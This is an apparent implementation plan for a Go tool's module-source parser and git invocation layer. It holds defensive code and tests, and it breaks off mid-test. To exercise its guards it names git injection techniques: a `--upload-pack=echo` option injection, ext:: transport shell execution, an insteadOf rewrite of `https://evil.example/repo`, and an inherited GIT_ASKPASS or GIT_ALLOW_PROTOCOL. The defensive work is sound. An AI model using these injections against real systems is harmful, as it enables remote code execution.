// round trip for anything Parse accepted: Parse(raw).String() == raw, byte for
// byte. It holds because Parse only splits — it refuses surrounding whitespace
// rather than trimming it, and never canonicalises a host, a trailing slash or
// a ".git" suffix. `infra export` (spec §28) regenerates a `modules:` entry from
// this, so normalising here would rewrite the user's own file under them.
//
// A Source built by hand rather than by Parse renders the same way and is not a
// round trip of anything; that is fine for a diagnostic, which is the only other
// caller.
func (s Source) String() string {
	if s.Ref == "" {
		return s.Location
	}
	return s.Location + ":" + s.Ref
}

// Parse classifies raw and validates it. origin is where the source was
// declared, and every diagnostic carries it.
func Parse(raw string, origin value.Origin) (Source, diag.Diagnostics) {
	p := parser{origin: origin}

	switch {
	case raw == "":
		return p.refuse("module source is empty",
			"A `modules:` entry must name a directory or a git repository.",
			"Write a path such as ./modules/networking, or a pinned remote such as https://github.com/acme/infra-networking:v1.0.0.")

	case strings.TrimSpace(raw) != raw:
		return p.refuse("module source "+strconv.Quote(raw)+" has surrounding whitespace",
			"The source is used verbatim as a path or a URL, so leading or trailing whitespace is never part of what was meant.",
			"Remove the whitespace around the value.")

	// Refused before anything else is decided, because a classification step
	// that runs first could send it down the path branch, where a leading
	// "-" is merely an odd directory name and no refusal would ever fire.
	// git parses an argument beginning with "-" as an option unless it is
	// separated by "--": measured, `git clone "--upload-pack=echo" dir`
	// consumed the URL as a flag.
	case strings.HasPrefix(raw, "-"):
		return p.refuse("module source "+strconv.Quote(raw)+" begins with \"-\"",
			"A source beginning with \"-\" is parsed by git as a command-line option rather than as a repository.",
			"If this is a directory, write it as ./"+strings.TrimPrefix(raw, "-")+" or as an absolute path.")
	}

	if helper, rest, ok := splitTransportHelper(raw); ok {
		return p.refuseHelper(helper, rest)
	}

	if scheme, rest, ok := splitScheme(raw); ok {
		switch scheme {
		case "https", "ssh":
			return p.parseURL(raw, scheme, rest)
		case "file":
			return p.refuse("module source "+strconv.Quote(raw)+" uses the file:// scheme",
				"A module on this filesystem is spelled as a path, not as a URL. A second spelling for the same thing only widens what the scheme allowlist has to reason about.",
				"Write it as a path: /"+strings.TrimPrefix(rest, "/")+".")
		default:
			return p.refuse("module source "+strconv.Quote(raw)+" uses the unsupported scheme "+strconv.Quote(scheme),
				"A git module source is https://, ssh://, or the git@host:path shorthand. Nothing else is fetched.",
				"Use https:// or ssh:// for a remote module, or a filesystem path for a local one.")
		}
	}

	if authority, path, ok := splitSCP(raw); ok {
		return p.parseSCP(raw, authority, path)
	}

	return Source{Kind: KindPath, Location: raw, Origin: origin}, nil
}

type parser struct {
	origin value.Origin
	ds     diag.Diagnostics
}

func (p *parser) refuse(summary, detail, action string) (Source, diag.Diagnostics) {
	p.ds.Add(diag.Diagnostic{
		Severity: diag.SeverityError,
		Summary:  summary,
		Detail:   detail,
		Action:   action,
		Origin:   p.origin,
	})
	return Source{}, p.ds
}

// refuseHelper refuses git's `<transport>::<address>` form. ext:: is named
// explicitly because it is not merely unsupported: git's ext transport runs its
// address as a shell command, so `ext::sh -c ...` in a module source is remote
// code execution at `infra plan` time. Measured: with protocol.ext.allow=always
// in a user's own gitconfig, git 2.43 executes it.
func (p *parser) refuseHelper(helper, rest string) (Source, diag.Diagnostics) {
	if helper == "ext" {
		return p.refuse("module source uses git's ext:: transport",
			"ext:: runs a shell command and speaks git's protocol over its standard input and output, so an ext:: module source executes "+strconv.Quote(rest)+" on this machine during planning. It is refused whatever it contains.",
			"If you meant a repository, write it as https://host/path:tag or ssh://host/path:tag.")
	}
	return p.refuse("module source uses the "+helper+":: transport helper",
		"A git module source is written as a plain URL. "+helper+":: selects a transport helper program, which is a wider surface than this language admits.",
		"Write the URL without the "+helper+":: prefix: "+rest+".")
}
```

Continue in the same file with the three form parsers and the ref validator:

```go
// parseURL handles https:// and ssh://. rest is everything after "://":
// authority, then "/", then the repository path, which carries the ":ref".
func (p *parser) parseURL(raw, scheme, rest string) (Source, diag.Diagnostics) {
	slash := strings.Index(rest, "/")
	if slash < 0 || slash == len(rest)-1 {
		return p.refuse("module source "+strconv.Quote(raw)+" has no repository path",
			"A git source names a host and then a repository: "+scheme+"://host/owner/repo:tag.",
			"Add the repository path and the tag or commit it is pinned to.")
	}
	authority, path := rest[:slash], rest[slash+1:]
	if d, bad := p.checkUserinfo(authority); bad {
		return d, p.ds
	}
	// The ref colon is looked for in the PATH only. Scanning the whole string
	// would find the scheme's colon here, and the host separator in the scp
	// form below; a port lives in the authority and is excluded for free.
	return p.finish(raw, path)
}

// parseSCP handles git's user@host:path shorthand.
func (p *parser) parseSCP(raw, authority, path string) (Source, diag.Diagnostics) {
	if d, bad := p.checkUserinfo(authority); bad {
		return d, p.ds
	}
	return p.finish(raw, path)
}

// checkUserinfo refuses a URL carrying credentials. A password or token in a
// module source would be written into modules.lock, printed by every diagnostic
// that names the source, and rendered in plan output — none of which goes
// through pkg/value.Format, the single redaction path. Refusing the spelling is
// how this package avoids needing a second one.
func (p *parser) checkUserinfo(authority string) (Source, bool) {
	at := strings.LastIndex(authority, "@")
	if at < 0 || !strings.Contains(authority[:at], ":") {
		return Source{}, false // no userinfo, or plain "git@host", which is the normal case
	}
	// The source is deliberately NOT echoed: it contains the secret, and
	// this package has no redaction path of its own — pkg/value.Format is
	// the only one in the product, and quoting the URL here would be a
	// second one written by accident.
	s, _ := p.refuse("module source carries credentials in its URL",
		"A password or token written into a module source is recorded in modules.lock, printed by every "+
			"diagnostic that names the source, and rendered in plan output, none of which redacts. The value "+
			"is not repeated here for that reason.",
		"Remove the credentials from the URL and let git supply them: a credential helper for https://, or a key for ssh://.")
	return s, true
}

// finish splits the required ":ref" off the repository path and validates it.
func (p *parser) finish(raw, path string) (Source, diag.Diagnostics) {
	colon := strings.LastIndex(path, ":")
	if colon < 0 {
		return p.refuse("module source "+strconv.Quote(raw)+" is not pinned to a tag or commit",
			"A remote module must name exactly what it is: an unpinned source plans differently on different days, because the branch it follows moves. The repository path here is "+strconv.Quote(path)+" with no \":tag-or-hash\" suffix.",
			"Add the version you want: "+raw+":v1.2.0, or "+raw+":9f3c1ab for a commit.")
	}
	ref := path[colon+1:]
	if ref == "" {
		return p.refuse("module source "+strconv.Quote(raw)+" has an empty ref",
			"The \":\" that pins a module source must be followed by a tag or a commit hash.",
			"Write "+strings.TrimSuffix(raw, ":")+":v1.2.0.")
	}
	if why, ok := validRef(ref); !ok {
		return p.refuse("module source ref "+strconv.Quote(ref)+" is not a valid tag or commit",
			"A ref is a git tag name or a commit hash: "+why+". Refs also reach git as arguments, so this is checked rather than passed through.",
			"Pin the source to a tag such as v1.2.0 or to a commit such as 9f3c1ab.")
	}
	return Source{
		Kind:     KindGit,
		Location: raw[:len(raw)-len(ref)-1],
		Ref:      ref,
		Origin:   p.origin,
	}, nil
}
```

And the three string helpers, kept at the bottom:

```go
// splitTransportHelper detects git's "<transport>::<address>" form.
func splitTransportHelper(raw string) (helper, rest string, ok bool) {
	i := strings.Index(raw, "::")
	if i <= 0 {
		return "", "", false
	}
	for _, r := range raw[:i] {
		if !isSchemeRune(r) {
			return "", "", false
		}
	}
	return raw[:i], raw[i+2:], true
}

// splitScheme detects "<scheme>://".
func splitScheme(raw string) (scheme, rest string, ok bool) {
	i := strings.Index(raw, "://")
	if i <= 0 {
		return "", "", false
	}
	scheme = strings.ToLower(raw[:i])
	if !('a' <= scheme[0] && scheme[0] <= 'z') {
		return "", "", false
	}
	for _, r := range scheme {
		if !isSchemeRune(r) {
			return "", "", false
		}
	}
	return scheme, raw[i+3:], true
}

// splitSCP detects git's user@host:path shorthand, which has no scheme. A "/"
// before the "@" means a filesystem path containing an "@" (./mods/a@b/net),
// not a remote.
func splitSCP(raw string) (authority, path string, ok bool) {
	at := strings.Index(raw, "@")
	if at <= 0 || strings.Contains(raw[:at], "/") {
		return "", "", false
	}
	colon := strings.Index(raw[at:], ":")
	if colon < 0 {
		return "", "", false
	}
	colon += at
	return raw[:colon], raw[colon+1:], true
}

func isSchemeRune(r rune) bool {
	return ('a' <= r && r <= 'z') || ('A' <= r && r <= 'Z') ||
		('0' <= r && r <= '9') || r == '+' || r == '-' || r == '.'
}

// validRef checks a tag name or commit hash. It is deliberately narrower than
// git-check-ref-format: this is an allowlist of what a module pin may be, and
// the ref is passed to git as part of a refspec.
func validRef(ref string) (why string, ok bool) {
	switch {
	case len(ref) > 128:
		return "it is longer than 128 characters", false
	case strings.HasPrefix(ref, "-"):
		return "it begins with \"-\", which git parses as an option", false
	case strings.HasPrefix(ref, "."), strings.HasSuffix(ref, "."):
		return "it begins or ends with \".\"", false
	case strings.Contains(ref, ".."):
		return "it contains \"..\"", false
	case strings.HasSuffix(ref, ".lock"):
		return "it ends with \".lock\", which git reserves", false
	case strings.HasPrefix(ref, "/"), strings.HasSuffix(ref, "/"), strings.Contains(ref, "//"):
		return "it begins, ends with, or doubles \"/\"", false
	}
	for _, r := range ref {
		switch {
		case 'a' <= r && r <= 'z', 'A' <= r && r <= 'Z', '0' <= r && r <= '9':
		case r == '.', r == '_', r == '-', r == '+', r == '/':
		default:
			return "it contains " + strconv.QuoteRune(r), false
		}
	}
	return "", true
}
```

#### 11.4a Minimal code: derivation

Append to `source.go`:

```go
// DeriveName derives the identifier a scalar `modules:` entry is loaded under:
// the last path segment of the repository or directory, ".git" removed, "-"
// normalised to "_" (Amendment 8d).
//
// It reads Source.Location, never raw text. Parse has already taken the ":ref"
// suffix off, which is what makes the strip ORDER structural rather than a rule
// someone has to remember: derive from raw text instead and
// "https://github.com/acme/infra.git:v1.2.0" yields "infra.git", because the
// string does not end in ".git" and nothing strips.
func DeriveName(s Source) (string, diag.Diagnostics) {
	path := strings.TrimRight(repoPath(s), "/")
	if i := strings.LastIndex(path, "/"); i >= 0 {
		path = path[i+1:]
	}
	name := strings.ReplaceAll(strings.TrimSuffix(path, ".git"), "-", "_")

	if !isIdentifier(name) {
		return "", one(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "no module name can be derived from " + strconv.Quote(s.Location),
			Detail: "A `modules:` entry written as a bare source is loaded under a name taken from its last path " +
				"segment, and that name is used as a resource type: `type: module.<name>`. " +
				strconv.Quote(name) + " is not a usable identifier.",
			Action: "Write the entry in its mapping form and name it yourself:\n" +
				"  - name: my_module\n    source: " + s.Location + refSuffix(s),
			Origin: s.Origin,
		})
	}
	return name, nil
}

// repoPath is the part of a location that names the repository or directory,
// with any authority removed. It uses the same two splitters Parse uses, which
// is the point: git's scp shorthand can carry a repository with no "/" in it at
// all ("git@github.com:infra-db"), and a naive last-"/" split derives the HOST.
func repoPath(s Source) string {
	if s.Kind != KindGit {
		return s.Location
	}
	if _, rest, ok := splitScheme(s.Location); ok {
		if i := strings.Index(rest, "/"); i >= 0 {
			return rest[i+1:]
		}
		return ""
	}
	if _, path, ok := splitSCP(s.Location); ok {
		return path
	}
	return s.Location
}

func refSuffix(s Source) string {
	if s.Ref == "" {
		return ""
	}
	return ":" + s.Ref
}

func isIdentifier(name string) bool {
	if name == "" {
		return false
	}
	for i, r := range name {
		switch {
		case 'a' <= r && r <= 'z', 'A' <= r && r <= 'Z', r == '_':
		case '0' <= r && r <= '9' && i > 0:
		default:
			return false
		}
	}
	return true
}
```

`one` is the single-diagnostic helper; Task 13 also uses it, so define it here in
`source.go` and let `cache.go` use it rather than declaring a second.

#### 11.5 Run it, see it pass

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./internal/modules/source/ && go vet ./internal/modules/source/ && gofmt -l internal/modules/source/
```

All three must be clean; `gofmt -l` printing a path is a failure.

#### 11.6 Sabotage, to prove the two tests most at risk can fail

Both of these are refusals, and a refusal test passes trivially if the function refuses
everything. Run each sabotage, confirm the named test fails, then revert.

1. In `finish`, replace `strings.LastIndex(path, ":")` with
   `strings.LastIndex(raw, ":")` — the C3 bug. Expect
   `TestParseRefusals/an_unpinned_scp-shorthand_remote` to fail (the unpinned source now
   parses as pinned) **and** `TestParseAcceptsTheThreeSourceForms/https_pinned_to_a_tag`
   to still pass, which is exactly why the bug is hard to see.
2. Delete the `strings.HasPrefix(raw, "-")` case. Expect
   `TestParseRefusals/a_flag` to fail with "returned ... with no error" — the flag became
   a relative directory name.
3. In `String`, return `strings.TrimSuffix(s.Location, "/") + ...`, the shape a
   "tidy it up" change would take. Expect `TestStringRoundTripsEveryAcceptedSource` to
   fail on `./modules/networking/`. This is the sabotage that matters most for a function
   that looks like it cannot be wrong.
4. **The discrimination step for the strip order**, which Author A wrote and this
   reproduces. In `DeriveName`, derive from raw text instead of from `Location` — replace
   the first line with `path := strings.TrimRight(repoPath(s)+refSuffix(s), "/")`, which
   is the shape any implementation that had not been given a parsed `Source` would have.
   Expect `TestDeriveName` to fail on
   `https://github.com/acme/infra.git:v1.2.0` with `got "infra.git:v1.2.0"`, and on the
   two scp rows. That failure is what makes the ordering claim in the comment testable
   rather than decorative.

Record all four outcomes in the commit message.

#### 11.7 Commit

```bash
git add internal/modules/source/source.go internal/modules/source/source_test.go
git commit -m "Add module source parsing, name derivation, and injection guards

internal/modules/source.Parse classifies a module source as a filesystem path or
a pinned git repository and refuses everything else by name: an unpinned remote
(Amendment 10a), a leading \"-\", the ext:: transport (naming it, because git
runs its address as a shell command), other transport helpers, file://, other
schemes, and a URL carrying credentials.

String() is an exact round trip of anything Parse accepted, byte for byte,
because Parse only splits and never canonicalises: `infra export` regenerates a
modules: entry from it, so a trailing slash, a .git suffix, a port and the host's
case all survive. A property test over every accepted spelling pins it.

DeriveName (Amendment 13d) takes the parsed Source and reads Location, so the
\":ref\" strip and the \".git\" strip cannot be applied in the wrong order and
git's scp shorthand with no \"/\" in it (git@github.com:infra-db:v1.0.0) derives
the repository rather than the host. A name that is not an identifier is a
diagnostic telling the user to write name:, which is why the mapping form exists.

Corrects Amendment 10 in one place: the \":ref\" suffix is found in the
repository path, never by scanning the whole string. Scanning finds the scheme's
colon in an unpinned https URL and the host separator in an unpinned
git@host:path, so the second parses as pinned to a valid-looking ref and 10a's
guard never fires.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>" -- internal/modules/source/source.go internal/modules/source/source_test.go
```

---

---

## Task 12 — the git invocation layer

### Why this task exists

This is the only code in the repository that executes another program. Three of the
measured behaviours above mean that "build the right argv" is not the whole job:

- **`url.<base>.insteadOf` rewrites the URL before the transport is chosen** (line 3), so
  Task 11's scheme allowlist can be walked around entirely by a line in the user's own
  `~/.gitconfig`. A source that Task 11 approved as `https://` can reach the transport
  layer as something else.
- **`GIT_ALLOW_PROTOCOL` in the inherited environment overrides `-c protocol.*.allow` in
  both directions** (line 4), so a policy set only through `-c` is not a policy.
- **`protocol.ext.allow=always` in a user's config re-enables `ext::` and the shell
  command runs** (line 5), so relying on git's own default is not a guard either.

**Amendment 17 rules on what those three measurements compose into: `GIT_ALLOW_PROTOCOL`
is SET in the child environment, and `-c protocol.*` is not used at all.** For each
invocation it names **exactly the one transport the location itself claims**. One
authoritative knob: it beats `-c`, it beats whatever the user's environment held because
we overwrite it, and it is enforced at the transport layer *after* every rewrite, so it
catches an `insteadOf` redirect that `Parse` structurally cannot see. `Parse`'s allowlist
remains the first guard and the source of the good diagnostic; it is no longer what the
safety rests on.

The alternative — setting `-c protocol.*` as well, in case a future git drops the
environment variable — was rejected as a second knob that can only ever agree or
disagree with the first. What covers that risk instead is a test: 12.3 fails the moment
git stops honouring `GIT_ALLOW_PROTOCOL`, because the rewrite it blocks would then
succeed. A canary is better than a spare, because a spare is silent when it becomes the
one doing the work.

The environment is built from an explicit passthrough list rather than from
`os.Environ()`, because the variables that must not be inherited (`GIT_ASKPASS`,
`GIT_SSH_COMMAND`, `GIT_ALLOW_PROTOCOL`, `GIT_CONFIG_*`) are open-ended, and a denylist
of an open-ended set is a list you update after each incident.

### Files

| Action | Path |
|--------|------|
| create | `internal/modules/source/git.go` |
| create | `internal/modules/source/git_test.go` |
| create | `internal/modules/source/testrepo_test.go` |

### Interfaces

**Produces** (all unexported — nothing outside the package runs git):

```go
type gitRunner struct {
    Timeout time.Duration // per invocation; zero means defaultGitTimeout
}

func (g gitRunner) run(ctx context.Context, dir, location string, args ...string) (string, error)
func (g gitRunner) lsRemoteCommit(ctx context.Context, location, ref string) (string, error)
func (g gitRunner) fetchCommit(ctx context.Context, dir string, s Source) (string, error)
func gitEnv(location string) []string
func transportOf(location string) string
```

### Steps

#### 12.1 The test repository helper

A local bare repository is a legitimate git remote and needs no network. Create
`internal/modules/source/testrepo_test.go`:

```go
package source

import (
	"os"
	"os/exec"
	"path/filepath"
	"testing"
)

// testRepo is a real git repository on disk, used as a remote by the tests in
// this package. It is created with an isolated HOME and no system or global
// config, so the developer's own gitconfig — a signing key, a hooks path, a
// default branch — cannot change what these tests exercise.
type testRepo struct {
	Path   string // the bare repository, usable as a git remote
	work   string
	Commit string // HEAD of the work tree at the time it was published
}

func newTestRepo(t *testing.T, files map[string]string) *testRepo {
	t.Helper()
	root := t.TempDir()
	r := &testRepo{Path: filepath.Join(root, "remote.git"), work: filepath.Join(root, "work")}

	if err := os.MkdirAll(r.work, 0o755); err != nil {
		t.Fatalf("mkdir work: %v", err)
	}
	r.git(t, r.work, "init", "-q", "-b", "main", ".")
	r.write(t, files)
	r.git(t, r.work, "add", "-A", ".")
	r.commitAll(t, "initial")
	r.git(t, root, "clone", "-q", "--bare", r.work, r.Path)
	return r
}

// write replaces the work tree's files.
func (r *testRepo) write(t *testing.T, files map[string]string) {
	t.Helper()
	for rel, body := range files {
		p := filepath.Join(r.work, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatalf("mkdir %s: %v", rel, err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatalf("write %s: %v", rel, err)
		}
	}
}

func (r *testRepo) commitAll(t *testing.T, msg string) {
	t.Helper()
	r.git(t, r.work, "-c", "user.email=test@infrata.invalid", "-c", "user.name=test",
		"-c", "commit.gpgsign=false", "commit", "-q", "-m", msg)
	r.Commit = r.gitOut(t, r.work, "rev-parse", "HEAD")
}

// Tag places a tag on the current HEAD and publishes it. annotated matters:
// an annotated tag's ls-remote line carries the TAG OBJECT's hash, not the
// commit's, which is the trap 12.7 pins.
func (r *testRepo) Tag(t *testing.T, name string, annotated bool) {
	t.Helper()
	if annotated {
		r.git(t, r.work, "-c", "user.email=test@infrata.invalid", "-c", "user.name=test",
			"tag", "-f", "-a", name, "-m", name)
	} else {
		r.git(t, r.work, "tag", "-f", name)
	}
	r.git(t, r.Path, "fetch", "-q", "--force", r.work, "+refs/tags/*:refs/tags/*")
}

// Commit adds a commit to the work tree and publishes main.
func (r *testRepo) CommitFiles(t *testing.T, files map[string]string, msg string) {
	t.Helper()
	r.write(t, files)
	r.git(t, r.work, "add", "-A", ".")
	r.commitAll(t, msg)
	r.git(t, r.Path, "fetch", "-q", "--force", r.work, "+refs/heads/*:refs/heads/*")
}

func (r *testRepo) git(t *testing.T, dir string, args ...string) {
	t.Helper()
	r.gitOut(t, dir, args...)
}

func (r *testRepo) gitOut(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = []string{
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + t.TempDir(),
		"GIT_CONFIG_GLOBAL=/dev/null",
		"GIT_CONFIG_SYSTEM=/dev/null",
		"GIT_TERMINAL_PROMPT=0",
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v in %s: %v\n%s", args, dir, err, out)
	}
	return trimLine(string(out))
}
```

`trimLine` is `strings.TrimSpace` of the first line; define it in `git.go` since production
needs it too.

**Not skipped if git is missing.** A `t.Skip` on a missing `git` would make this whole
task's coverage vanish silently on the machine where it vanished. The feature is
implemented by shelling out to git; a machine without git cannot run it, and the test
saying so is correct.

#### 12.2 Failing test: a tag is fetched, checked out, and its commit returned

Create `internal/modules/source/git_test.go`:

```go
package source

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// gitSource builds a Source that Parse cannot produce: KindGit whose location is
// a filesystem path. That combination is unreachable from configuration —
// TestParseNeverReturnsAGitSourceForAPath pins that — and it is how this package
// tests real git fetching with no network. Everything under test below is the
// production path; only the classification is bypassed.
func gitSource(location, ref string) Source {
	return Source{Kind: KindGit, Location: location, Ref: ref}
}

func TestFetchCommitChecksOutATagAndReturnsItsCommit(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)

	dir := filepath.Join(t.TempDir(), "checkout")
	got, err := gitRunner{}.fetchCommit(context.Background(), dir, gitSource(repo.Path, "v1.0.0"))
	if err != nil {
		t.Fatalf("fetchCommit: %v", err)
	}
	if got != repo.Commit {
		t.Errorf("commit = %q, want %q", got, repo.Commit)
	}
	if _, err := os.Stat(filepath.Join(dir, "module.yml")); err != nil {
		t.Errorf("module.yml is not in the checkout: %v — a fetch that does not check out a work tree gives stage 5 nothing to load", err)
	}
}

// TestFetchCommitPeelsAnAnnotatedTag is the trap measured as line 10. An
// annotated tag is an object in its own right, and `git ls-remote <url>
// refs/tags/v2.0.0` returns THAT object's hash, not the commit's. Record the
// tag object in modules.lock and every subsequent run compares it against the
// checked-out commit, disagrees, and reports a moved tag that never moved.
// Delete the "^{commit}" suffix in fetchCommit and this fails.
func TestFetchCommitPeelsAnAnnotatedTagToItsCommit(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v2.0.0", true)

	dir := filepath.Join(t.TempDir(), "checkout")
	got, err := gitRunner{}.fetchCommit(context.Background(), dir, gitSource(repo.Path, "v2.0.0"))
	if err != nil {
		t.Fatalf("fetchCommit: %v", err)
	}
	if got != repo.Commit {
		t.Errorf("commit = %q, want the COMMIT %q; an annotated tag's own object hash is not the commit it points at", got, repo.Commit)
	}
}

// TestFetchCommitResolvesAnAbbreviatedHash covers measured line 14: an
// abbreviated hash cannot be fetched as a ref at all, so the depth-1 route does
// not work and fetchCommit must take the full-fetch-then-resolve route. PLAN.md
// §11 spells a hash pin abbreviated ("9f3c1ab"), so this is the documented form.
func TestFetchCommitResolvesAnAbbreviatedHash(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})

	dir := filepath.Join(t.TempDir(), "checkout")
	got, err := gitRunner{}.fetchCommit(context.Background(), dir, gitSource(repo.Path, repo.Commit[:7]))
	if err != nil {
		t.Fatalf("fetchCommit: %v", err)
	}
	if got != repo.Commit {
		t.Errorf("commit = %q, want %q", got, repo.Commit)
	}
}

func TestFetchCommitReportsAMissingRef(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})

	dir := filepath.Join(t.TempDir(), "checkout")
	_, err := gitRunner{}.fetchCommit(context.Background(), dir, gitSource(repo.Path, "v9.9.9"))
	if err == nil {
		t.Fatal("fetchCommit succeeded for a tag that does not exist")
	}
	if !strings.Contains(err.Error(), "v9.9.9") {
		t.Errorf("error does not name the ref: %v", err)
	}
}

// TestLsRemoteCommitReportsAMissingRefRatherThanSucceeding covers measured line
// 12: `git ls-remote` for a ref that does not exist EXITS 0 with empty output.
// Treat exit status as the answer and a missing tag becomes an empty commit
// hash, which modules.lock would then record. Delete the empty-output check and
// this fails.
func TestLsRemoteCommitReportsAMissingRefRatherThanSucceeding(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)

	if _, err := gitRunner{}.lsRemoteCommit(context.Background(), repo.Path, "v1.0.0"); err != nil {
		t.Fatalf("lsRemoteCommit for an existing tag: %v", err)
	}
	got, err := gitRunner{}.lsRemoteCommit(context.Background(), repo.Path, "v9.9.9")
	if err == nil {
		t.Fatalf("lsRemoteCommit returned %q and no error for a tag that does not exist", got)
	}
}

// TestLsRemoteCommitPeelsAnAnnotatedTag is the same trap as the fetch side, on
// the cheap path that 13.6 uses to detect a moved tag WITHOUT fetching. If this
// one regresses, every annotated-tag module reports a moved tag on every run.
func TestLsRemoteCommitPeelsAnAnnotatedTag(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v2.0.0", true)

	got, err := gitRunner{}.lsRemoteCommit(context.Background(), repo.Path, "v2.0.0")
	if err != nil {
		t.Fatalf("lsRemoteCommit: %v", err)
	}
	if got != repo.Commit {
		t.Errorf("commit = %q, want the commit %q, not the tag object", got, repo.Commit)
	}
}
```

#### 12.3 Failing test: the transport a location does not name is refused

This is the guard against `insteadOf` rewriting, and it is testable entirely offline
because the rewrite target is a local path.

```go
// TestGitRefusesATransportTheLocationDoesNotName pins the second of Amendment
// 10c's guards. Measured: git applies url.<base>.insteadOf BEFORE choosing a
// transport, so a source that Parse approved as https:// can arrive at the
// transport layer as something else entirely — here, a local path. The
// per-invocation protocol policy is what refuses it.
//
// This test is the one that proves GIT_ALLOW_PROTOCOL is doing the work rather
// than Parse's allowlist, because Parse approved this URL. Delete the
// GIT_ALLOW_PROTOCOL entry in gitEnv and it fails: the rewrite succeeds and the
// fetch returns a commit.
//
// It is also the canary for the one risk in having a single knob. If a future
// git stops honouring GIT_ALLOW_PROTOCOL, this test starts failing on the day
// that happens rather than on the day someone exploits it.
func TestGitRefusesATransportTheLocationDoesNotName(t *testing.T) {
	repo := newTestRepo(t, map[string]string{"module.yml": "inputs: {}\n"})
	repo.Tag(t, "v1.0.0", false)

	home := t.TempDir()
	cfg := "[url \"" + repo.Path + "\"]\n\tinsteadOf = https://evil.example/repo\n"
	if err := os.WriteFile(filepath.Join(home, ".gitconfig"), []byte(cfg), 0o644); err != nil {
		t.Fatalf("write .gitconfig: %v", err)
	}
	t.Setenv("HOME", home)

	dir := filepath.Join(t.TempDir(), "checkout")
	got, err := gitRunner{}.fetchCommit(context.Background(), dir,
		gitSource("https://evil.example/repo", "v1.0.0"))
	if err == nil {
		t.Fatalf("fetchCommit returned %q; a source claiming https:// must not be served over another transport, however the user's gitconfig rewrites it", got)
	}
	if !strings.Contains(err.Error(), "not allowed") {
		t.Errorf("error does not read as a refused transport: %v", err)
	}
}

// TestTransportOfNamesExactlyWhatTheLocationClaims is the unit half. The policy
// must be derived per invocation rather than fixed, so that the set of permitted
// transports is never wider than the one the source names.
func TestTransportOfNamesExactlyWhatTheLocationClaims(t *testing.T) {
	for location, want := range map[string]string{
		"https://github.com/acme/repo": "https",
		"ssh://git@host/acme/repo":     "ssh",
		"git@github.com:acme/repo":     "ssh",
		"/srv/repos/bare.git":          "file",
		"./bare.git":                   "file",
	} {
		if got := transportOf(location); got != want {
			t.Errorf("transportOf(%q) = %q, want %q", location, got, want)
		}
	}
}
```

#### 12.4 Failing test: a remote that asks for a password fails instead of hanging

Amendment 10d, and the one place where what a test can honestly claim is narrower than
the requirement. Measured line 9: **with no controlling terminal, git fails fast even
with no guard at all**, so a test that merely runs git under `go test` proves nothing
about `GIT_TERMINAL_PROMPT`. Measured line 7: an inherited `GIT_ASKPASS` that blocks does
make git block. So the end-to-end test seeds a blocking askpass in the environment and
asserts the fetch still fails quickly — which is a real failure when the override is
deleted — and the terminal-prompt half is pinned separately by 12.5.

```go
// TestFetchDoesNotHangWhenTheRemoteAsksForAPassword is Amendment 10d's
// end-to-end half. The server is a loopback httptest server returning 401, so
// there is no network access; the environment carries a GIT_ASKPASS that blocks
// for a minute, which is what a private repository plus an interactive
// credential path looks like from the inside.
//
// Delete the GIT_ASKPASS override in gitEnv and this fails by timing out —
// which is the same way the bug hangs the CLI.
func TestFetchDoesNotHangWhenTheRemoteAsksForAPassword(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("WWW-Authenticate", `Basic realm="private"`)
		w.WriteHeader(http.StatusUnauthorized)
	}))
	defer srv.Close()

	blocking := filepath.Join(t.TempDir(), "askpass.sh")
	if err := os.WriteFile(blocking, []byte("#!/bin/sh\nsleep 60\necho nobody\n"), 0o755); err != nil {
		t.Fatalf("write askpass: %v", err)
	}
	t.Setenv("GIT_ASKPASS", blocking)
	t.Setenv("GIT_TERMINAL_PROMPT", "1")

	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()

	start := time.Now()
	dir := filepath.Join(t.TempDir(), "checkout")
	_, err := gitRunner{Timeout: 15 * time.Second}.fetchCommit(ctx, dir,
		gitSource(srv.URL+"/repo.git", "v1.0.0"))
	elapsed := time.Since(start)

	if err == nil {
		t.Fatal("fetchCommit succeeded against a server that demands credentials")
	}
	if elapsed > 10*time.Second {
		t.Errorf("fetchCommit took %s; it must fail rather than wait on a prompt nothing will answer", elapsed)
	}
}
```

The location here is `http://127.0.0.1:PORT/repo.git`, which `Parse` refuses. It reaches
`fetchCommit` the same way every other test in this file does, and `transportOf` returns
`"http"` for it — the policy names the transport the location claims, whatever that is,
so this test exercises the askpass guard rather than being stopped by the protocol guard
before it gets there. If `transportOf` had a fixed allowlist, this test would pass for
the wrong reason; that is why it does not.

#### 12.5 Failing test: the environment itself

```go
// TestGitEnvDisablesPromptingAndPinsTheTransport asserts on the environment
// gitEnv builds rather than on git's behaviour, and that is deliberate: with no
// controlling terminal git fails fast whether or not GIT_TERMINAL_PROMPT is set
// (measured), so the terminal-prompt half of Amendment 10d has no end-to-end
// failure mode under `go test`. This test does have one — delete the line and it
// fails — and 12.4 covers the half that can be proved from the outside.
func TestGitEnvDisablesPromptingAndPinsTheTransport(t *testing.T) {
	t.Setenv("GIT_ASKPASS", "/usr/bin/inherited-askpass")
	t.Setenv("GIT_ALLOW_PROTOCOL", "ext:file:https")
